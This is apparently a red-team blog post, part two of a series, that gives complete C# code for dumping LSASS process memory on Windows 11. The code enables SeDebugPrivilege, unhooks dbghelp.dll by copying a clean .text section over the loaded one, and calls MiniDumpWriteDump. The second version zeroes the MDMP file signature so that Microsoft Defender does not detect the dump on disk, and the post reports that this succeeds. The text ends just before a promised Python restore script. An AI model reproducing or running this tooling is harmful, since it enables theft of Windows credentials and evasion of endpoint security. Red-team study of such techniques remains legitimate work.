---
title: "Dumping LSASS on Windows 11 - Part2"
layout: "post"
categories: "Windows"
tags: ["Red Team"]
---

Hey everyone, today I'm going to be finishing the blog on dumping LSASS on Windows 11. To kick things off, I will start where we left off which is developing a .Net assembly to dump LSASS and pairing it with the previously developed In-Process Patchless AMSI Bypass PowerShell script. I will be using this github as the base code but transforming the C++ into C#, [https://github.com/peiga/DumpThatLSASS/tree/main](https://github.com/peiga/DumpThatLSASS/tree/main). The code does API unhooking of MiniDumpWriteDump function by getting a fresh copy of DbgHelp.dll from disk. It then copies the .text of the unhooked and clean DbgHelp.dll to overwrite the .text of the loaded DbgHelp.dll effectively overwriting and unhooking any of hooks that were placed on MiniDumpWriteDump or other functions in the DLL. In the orginal implementation the author used string obfuscation which is a good technique and a common baseline for malware tools. Though for my blog I didn't need to add it but I do recommend it for modern EDRs along with a lof of other techniques I will highight in a future EDR blog. As mentioned in part 1 of this blog, Defender doesn't flag the dumping of LSASS but it does flag when the content is written to disk. We say with that with the Golang code that sent the dump to a remote machine via an anonymous pipe. Defender never flagged during the operation even though the code wasn't obfuscated or encrypted. In my debugging with a .Net assebmly I observed the same behavior. In my implementation below I dump LSASS to a file on disk called test.txt and then after closing the handle to write to the file, I read in all the bytes from the file and then xor them by a key of 0xFF. I have provided the code below. 

``` cs

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class Program
{

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("dbghelp.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
	
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);


    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }
	
	 [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint Misc;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
	const uint GENERIC_READ = 0x80000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint OPEN_EXISTING = 3;
    const uint PAGE_READONLY = 0x02;
    const uint SEC_IMAGE = 0x1000000;
    const uint FILE_MAP_READ = 0x0004;

    static void Main()
    {
        int pid = 0;

        foreach (Process proc in Process.GetProcesses())
        {
            string prefix = "ls";
            string suffix = "ass";
            string serviceName = prefix + suffix;

            if (proc.ProcessName == serviceName)
            {
                pid = proc.Id;
                Console.WriteLine("[+] The Process PID: " + pid);
                break;
            }
        }

        if (!IsElevated())
        {
            Console.WriteLine("Not admin");
            return;
        }
        if (!SetDebugPrivilege())
        {
            Console.WriteLine("No SeDebugPrivilege");
            return;
        }

        FreshCopyDbghelp();

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed in OpenProcess");
            return;
        }

        pd(hProcess);
        CloseHandle(hProcess);
    }

    static bool IsElevated()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out hToken))
        {
            return false;
        }

        TOKEN_ELEVATION elevation = new TOKEN_ELEVATION();
        int size = Marshal.SizeOf(elevation);
        IntPtr elevationPtr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(elevation, elevationPtr, false);

        uint returnedSize;
        bool success = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, (uint)size, out returnedSize);
        if (!success)
        {
            CloseHandle(hToken);
            return false;
        }

        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION));
        Marshal.FreeHGlobal(elevationPtr);
        CloseHandle(hToken);

        return elevation.TokenIsElevated != 0;
    }

    static bool SetDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            CloseHandle(hToken);
            Console.WriteLine("I don't have SeDebugPrivilege");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            CloseHandle(hToken);
            Console.WriteLine("Could not adjust to SeDebugPrivilege");
            return false;
        }

        CloseHandle(hToken);
        return true;
    }


    static void FreshCopyDbghelp()
    {
        string dbghelpPath = @"C:\Windows\System32\dbghelp.dll";
        IntPtr hFile = CreateFile(dbghelpPath, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open dbghelp.dll");
            return;
        }

        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READONLY | SEC_IMAGE, 0, 0, null);
        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("Failed in CreateFileMapping");
            CloseHandle(hFile);
            return;
        }

        IntPtr pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, UIntPtr.Zero);
        if (pMapping == IntPtr.Zero)
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed in MapViewOfFile. Error code: " + errorCode);
            CloseHandle(hFileMapping);
            CloseHandle(hFile);
            return;
        }

        IntPtr hDbghelp = GetModuleHandle("dbghelp.dll");
        IntPtr pDosHeader = pMapping;
        IMAGE_DOS_HEADER idh = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pDosHeader, typeof(IMAGE_DOS_HEADER));
        IntPtr pNtHeaders = IntPtr.Add(pDosHeader, idh.e_lfanew);
        IMAGE_NT_HEADERS inh = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS));

        for (int i = 0; i < inh.FileHeader.NumberOfSections; i++)
        {
            IntPtr pishPtr = IntPtr.Add(pNtHeaders, Marshal.SizeOf(inh) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))));
            IMAGE_SECTION_HEADER pish = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pishPtr, typeof(IMAGE_SECTION_HEADER));

            if (Encoding.UTF8.GetString(pish.Name).TrimEnd('\0') == ".text")
            {
                IntPtr textSection = IntPtr.Add(hDbghelp, (int)pish.VirtualAddress);
                uint oldProtect;
                if (!VirtualProtect(textSection, new UIntPtr(pish.Misc), 0x40, out oldProtect))
                {
                    return;
                }

                for (int j = 0; j < pish.Misc; j++)
                {
                    Marshal.WriteByte(textSection, j, Marshal.ReadByte(IntPtr.Add(pMapping, (int)pish.PointerToRawData + j)));
                }

                VirtualProtect(textSection, new UIntPtr(pish.Misc), oldProtect, out oldProtect);
            }
        }

        CloseHandle(hFileMapping);
        CloseHandle(hFile);
    }

    static void pd(IntPtr hProcess)
	{
		string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string outputPath = Path.Combine(desktopPath, "test.txt");
        Console.WriteLine("Output Path: " + outputPath);
		IntPtr hFile = CreateFile(outputPath, 0x40000000, 0, IntPtr.Zero, 2, 0, IntPtr.Zero);
		if (hFile == IntPtr.Zero)
		{
			Console.WriteLine("Failed to create dump file");
			return;
		}

		if (!MiniDumpWriteDump(hProcess, (uint)Process.GetCurrentProcess().Id, hFile, 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
		{
			Console.WriteLine("Failed to write dump");
			CloseHandle(hFile);
			return;
		}

		Console.WriteLine("Dump successfully written to: " + outputPath);

		CloseHandle(hFile);

		byte[] dumpData = File.ReadAllBytes(outputPath);

		for (int i = 0; i < dumpData.Length; i++)
		{
			dumpData[i] ^= 0xFF;
		}

		File.WriteAllBytes(outputPath, dumpData);

		Console.WriteLine("Dump XORed and written back to: " + outputPath);
	}

}

```

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\test.cs                           
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/defender_caught_lsass_write.bmp)


We see after executing the code that Defender flags on the writing of LSASS content to disk before we are able to overwrite the contents of test.txt with the XORed version. So it seems that Defender does have analysis to quickly look at files but how was it able to determine so quickly that the file was malicious? To better understand this I performed a dump without Defender enabled and then transferred test.txt to my Kali box. Then I use below command to analyze the file. 

```bash
xxd -l 256 lsass.dmp
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/mdmp_signature.bmp)

When analyzing the dump we see the file type at the beginning which is MDMP (Windows MiniDump). THis is how Windows quickly analyzed the file, they grabbed the file type and then anaylzed enough to see it was LSASS content. So there detection is purely signature based which is a common flaw of most security solutions. To bypass this I will perform the dump on a temporary file, then quickly overwrite the first 4 bytes of the file which is the file type to nullbytes. Then we will see if Defender flags the file. I have provided the updated code below. 

```cs 

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.IO.MemoryMappedFiles;


class Program
{

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
	
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);

	[DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }
	
	 [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint Misc;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
	const uint GENERIC_READ = 0x80000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint OPEN_EXISTING = 3;
    const uint PAGE_READONLY = 0x02;
    const uint SEC_IMAGE = 0x1000000;
    const uint FILE_MAP_READ = 0x0004;

    static void Main()
    {
        int pid = 0;

        foreach (Process proc in Process.GetProcesses())
        {
            string prefix = "ls";
            string suffix = "ass";
            string serviceName = prefix + suffix;

            if (proc.ProcessName == serviceName)
            {
                pid = proc.Id;
                Console.WriteLine("[+] The Process PID: " + pid);
                break;
            }
        }

        if (!IsElevated())
        {
            Console.WriteLine("Not admin");
            return;
        }
        if (!SetDebugPrivilege())
        {
            Console.WriteLine("No SeDebugPrivilege");
            return;
        }

        FreshCopyDbghelp();

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed in OpenProcess");
            return;
        }

        pd(hProcess);
        CloseHandle(hProcess);
    }

    static bool IsElevated()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out hToken))
        {
            return false;
        }

        TOKEN_ELEVATION elevation = new TOKEN_ELEVATION();
        int size = Marshal.SizeOf(elevation);
        IntPtr elevationPtr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(elevation, elevationPtr, false);

        uint returnedSize;
        bool success = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, (uint)size, out returnedSize);
        if (!success)
        {
            CloseHandle(hToken);
            return false;
        }

        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION));
        Marshal.FreeHGlobal(elevationPtr);
        CloseHandle(hToken);

        return elevation.TokenIsElevated != 0;
    }

    static bool SetDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            CloseHandle(hToken);
            Console.WriteLine("I don't have SeDebugPrivilege");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            CloseHandle(hToken);
            Console.WriteLine("Could not adjust to SeDebugPrivilege");
            return false;
        }

        CloseHandle(hToken);
        return true;
    }


    static void FreshCopyDbghelp()
    {
        string dbghelpPath = @"C:\Windows\System32\dbghelp.dll";
        IntPtr hFile = CreateFile(dbghelpPath, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open dbghelp.dll");
            return;
        }

        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READONLY | SEC_IMAGE, 0, 0, null);
        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("Failed in CreateFileMapping");
            CloseHandle(hFile);
            return;
        }

        IntPtr pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, UIntPtr.Zero);
        if (pMapping == IntPtr.Zero)
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed in MapViewOfFile. Error code: " + errorCode);
            CloseHandle(hFileMapping);
            CloseHandle(hFile);
            return;
        }

        IntPtr hDbghelp = GetModuleHandle("dbghelp.dll");
        IntPtr pDosHeader = pMapping;
        IMAGE_DOS_HEADER idh = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pDosHeader, typeof(IMAGE_DOS_HEADER));
        IntPtr pNtHeaders = IntPtr.Add(pDosHeader, idh.e_lfanew);
        IMAGE_NT_HEADERS inh = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS));

        for (int i = 0; i < inh.FileHeader.NumberOfSections; i++)
        {
            IntPtr pishPtr = IntPtr.Add(pNtHeaders, Marshal.SizeOf(inh) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))));
            IMAGE_SECTION_HEADER pish = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pishPtr, typeof(IMAGE_SECTION_HEADER));

            if (Encoding.UTF8.GetString(pish.Name).TrimEnd('\0') == ".text")
            {
                IntPtr textSection = IntPtr.Add(hDbghelp, (int)pish.VirtualAddress);
                uint oldProtect;
                if (!VirtualProtect(textSection, new UIntPtr(pish.Misc), 0x40, out oldProtect))
                {
                    return;
                }

                for (int j = 0; j < pish.Misc; j++)
                {
                    Marshal.WriteByte(textSection, j, Marshal.ReadByte(IntPtr.Add(pMapping, (int)pish.PointerToRawData + j)));
                }

                VirtualProtect(textSection, new UIntPtr(pish.Misc), oldProtect, out oldProtect);
            }
        }

        CloseHandle(hFileMapping);
        CloseHandle(hFile);
    }

	
	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);


    [DllImport("dbghelp.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    static void pd(IntPtr hProcess)
    {
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string outputPath = Path.Combine(desktopPath, "test.txt");
        Console.WriteLine("Output Path: " + outputPath);

        string tempPath = Path.GetTempFileName(); 

        IntPtr hTempFile = CreateFile(tempPath, 0x40000000, 0, IntPtr.Zero, 2, 0, IntPtr.Zero);
        if (hTempFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create temporary file");
            return;
        }

        if (!MiniDumpWriteDump(hProcess, (uint)Process.GetCurrentProcess().Id, hTempFile, 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)) // MiniDumpWithFullMemory
        {
            Console.WriteLine("Failed to write dump");
            CloseHandle(hTempFile);
            return;
        }

        CloseHandle(hTempFile);

        // Overwrite the first 4 bytes of the temporary file with null bytes
        using (FileStream fs = new FileStream(tempPath, FileMode.Open, FileAccess.Write))
        {
            fs.Seek(0, SeekOrigin.Begin);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
        }

        // Delete the existing file if exists
        File.Delete(outputPath); 

         // Rename the temporary file to the desired file name
        File.Move(tempPath, outputPath);

        Console.WriteLine("Dump successfully written to: " + outputPath);
    }

}
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/bypassed_defender_lsass_write.bmp)

Now when running the code we see Defender doesn't flag the file that is dropped on disk. We can transfer this back to our kali machine and then create a Python script to restore the first 4 bytes of the file so that we have the correct LSASS dump. I have provided the code below for the Python script that will add back the MDMP file siguature to the test.txt file below. 